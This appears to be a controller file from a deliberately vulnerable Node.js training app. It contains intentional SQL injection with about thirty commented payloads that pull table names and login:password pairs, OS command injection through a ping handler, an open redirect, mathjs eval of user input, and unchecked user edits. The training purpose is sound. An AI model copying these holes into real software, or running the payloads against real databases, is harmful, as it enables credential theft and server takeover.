var db = require('../models')
var bCrypt = require('bcrypt')
const exec = require('child_process').exec;
var mathjs = require('mathjs')
const Op = db.Sequelize.Op

module.exports.userSearch = function(req, res) {
	const request_data = req.body[0]
	var query = "SELECT name,id FROM Users WHERE login='" + request_data.value +
		"'";

	// # SELECT name,id FROM Users WHERE login='' UNION ALL SELECT NULL,version() #
	// # SELECT name,id FROM Users WHERE login='' UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='dvna' #
	// # SELECT name,id FROM Users WHERE login='' UNION ALL SELECT NULL,concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='users' #
	// # SELECT name,id FROM Users WHERE login='' UNION ALL SELECT NULL,concat(0x28,login,0x3a,password,0x29) FROM users #
	// # SELECT name,id FROM Users WHERE login='' UNION ALL SELECT NULL,concat(0x28,login,0x3a,password,0x29) FROM dvna.users #
	// # SELECT name,id FROM Users WHERE login='' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 0,1))) #
	// # SELECT name,id FROM Users WHERE login='' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="dvna" LIMIT 0,1))) #
	// # SELECT * FROM Users WHERE login='' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_NAME="users" LIMIT 0,1))) #
	// # SELECT * FROM Users WHERE login='' AND extractvalue(rand(),concat(0x3a,(SELECT concat(login,0x3a,password) FROM users LIMIT 0,1))) #
	// # SELECT * FROM Users WHERE login='' AND extractvalue(rand(),concat(0x3a,(SELECT concat(login,0x3a,password) FROM dvna.users LIMIT 0,1))) #
	// # SELECT * FROM Users WHERE login='' AND(SELECT 1 FROM(SELECT COUNT(*),concat(version(),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #
	// # SELECT name,id FROM Users WHERE login='' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.TABLES GROUP BY a LIMIT 0,1)b) #
	// # SELECT name,id FROM Users WHERE login='' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.COLUMNS GROUP BY a LIMIT 0,1)b) #
	// # SELECT name,id FROM Users WHERE login='' AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT name FROM users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #
	// # SELECT name,id FROM Users WHERE login='' AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT name FROM dvna.users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #
	// # SELECT name,id FROM Users WHERE login='' AND (ascii(substr((SELECT version()),1,1))) > 52 #
	// # SELECT name,id FROM Users WHERE login='' AND (SELECT version()) LIKE "5%" #
	// # SELECT name,id FROM Users WHERE login='' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) > 95 #
	// # SELECT name,id FROM Users WHERE login='' AND (ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="dvna" LIMIT 0,1),1,1))) > 95 #
	// # SELECT name,id FROM Users WHERE login='' AND (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="users" LIMIT 0,1),1,1))) > 95 #
	// # SELECT name,id FROM Users WHERE login='' AND (ascii(substr((SELECT name FROM users LIMIT 0,1),1,1))) > 95 #
	// # SELECT name,id FROM Users WHERE login='' AND (ascii(substr((SELECT name FROM dvna.users LIMIT 0,1),1,1))) > 95 #
	// # SELECT name,id FROM Users WHERE login='' AND sleep(10) #
	// # SELECT name,id FROM Users WHERE login='' AND IF((SELECT ascii(substr(version(),1,1))) > 53,sleep(10),NULL) #
	// # SELECT name,id FROM Users WHERE login='' AND IF((SELECT version()) LIKE "5%",sleep(10),NULL) #
	// # SELECT name,id FROM Users WHERE login='' AND IF(((ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #
	// # SELECT name,id FROM Users WHERE login='' AND IF(((ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="dvna" LIMIT 0,1),1,1))))> 95,sleep(10),NULL) #
	// # SELECT name,id FROM Users WHERE login='' AND IF(((ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="users" LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #
	// # SELECT name,id FROM Users WHERE login='' AND IF(((ascii(substr((SELECT name FROM users LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #
	// # SELECT name,id FROM Users WHERE login='' AND IF(((ascii(substr((SELECT name FROM dvna.users LIMIT 0,1),1,1)))) >95,sleep(10),NULL) #

	db.sequelize.query(query, {
		model: db.User
	}).then(user => {
		var output = {
			msg: 'Script Executed',
			response: {
				original_request: request_data.value,
				data: user
			}
		}
		res.json(output);
	}).catch(err => {
		var output = {
			msg: 'Internal Error',
			response: {
				original_request: request_data.value,
				data: []
			}
		}
		res.json(output);
	})
}

module.exports.xss = function(req, res) {
	const request_data = req.body;
	var output = {
		msg: 'Script Executed',
		response: {
			original_request: request_data.value
		}
	}
	res.json(output);
}

module.exports.ping = function(req, res) {
	exec('ping -n 2 ' + req.body[0].value, function(err, stdout, stderr) {
		output = stdout + stderr
		res.json({
			output: output
		})
	})
}

module.exports.listProducts = function(req, res) {
	db.Product.findAll().then(products => {
		output = {
			products: products
		}
		res.render('app/products', {
			output: output
		})
	})
}

module.exports.productSearch = function(req, res) {
	db.Product.findAll({
		where: {
			name: {
				[Op.like]: '%' + req.body.name + '%'
			}
		}
	}).then(products => {
		output = {
			products: products,
			searchTerm: req.body.name
		}
		res.render('app/products', {
			output: output
		})
	})
}

module.exports.modifyProduct = function(req, res) {
	if (!req.query.id || req.query.id == '') {
		output = {
			product: {}
		}
		res.render('app/modifyproduct', {
			output: output
		})
	} else {
		db.Product.find({
			where: {
				'id': req.query.id
			}
		}).then(product => {
			if (!product) {
				product = {}
			}
			output = {
				product: product
			}
			res.render('app/modifyproduct', {
				output: output
			})
		})
	}
}

module.exports.modifyProductSubmit = function(req, res) {
	if (!req.body.id || req.body.id == '') {
		req.body.id = 0
	}
	db.Product.find({
		where: {
			'id': req.body.id
		}
	}).then(product => {
		if (!product) {
			product = new db.Product()
		}
		product.code = req.body.code
		product.name = req.body.name
		product.description = req.body.description
		product.tags = req.body.tags
		product.save().then(p => {
			if (p) {
				req.flash('success', 'Product added/modified!')
				res.redirect('/app/products')
			}
		}).catch(err => {
			output = {
				product: product
			}
			req.flash('danger', err)
			res.render('app/modifyproduct', {
				output: output
			})
		})
	})
}

module.exports.userEdit = function(req, res) {
	res.render('app/useredit', {
		userId: req.user.id,
		userEmail: req.user.email,
		userName: req.user.name
	})
}

module.exports.userEditSubmit = function(req, res) {
	db.User.find({
		where: {
			'id': req.body.id
		}
	}).then(user => {
		if (req.body.password.length > 0) {
			if (req.body.password.length > 0) {
				if (req.body.password == req.body.cpassword) {
					user.password = bCrypt.hashSync(req.body.password, bCrypt.genSaltSync(
						10), null)
				} else {
					req.flash('warning', 'Passwords dont match')
					res.render('app/useredit', {
						userId: req.user.id,
						userEmail: req.user.email,
						userName: req.user.name,
					})
					return
				}
			} else {
				req.flash('warning', 'Invalid Password')
				res.render('app/useredit', {
					userId: req.user.id,
					userEmail: req.user.email,
					userName: req.user.name,
				})
				return
			}
		}
		user.email = req.body.email
		user.name = req.body.name
		user.save().then(function() {
			req.flash('success', "Updated successfully")
			res.render('app/useredit', {
				userId: req.body.id,
				userEmail: req.body.email,
				userName: req.body.name,
			})
		})
	})
}

module.exports.redirect = function(req, res) {
	if (req.query.url) {
		res.redirect(req.query.url)
	} else {
		res.send('invalid redirect url')
	}
}

module.exports.calc = function(req, res) {
	if (req.body.eqn) {
		res.render('app/calc', {
			output: mathjs.eval(req.body.eqn)
		})
	} else {
		res.render('app/calc', {
			output: 'Enter a valid math string like (3+3)*2'
		})
	}
}

module.exports.listUsersAPI = function(req, res) {
	db.User.findAll({}).then(users => {
		res.status(200).json({
			success: true,
			users: users
		})
	})
}
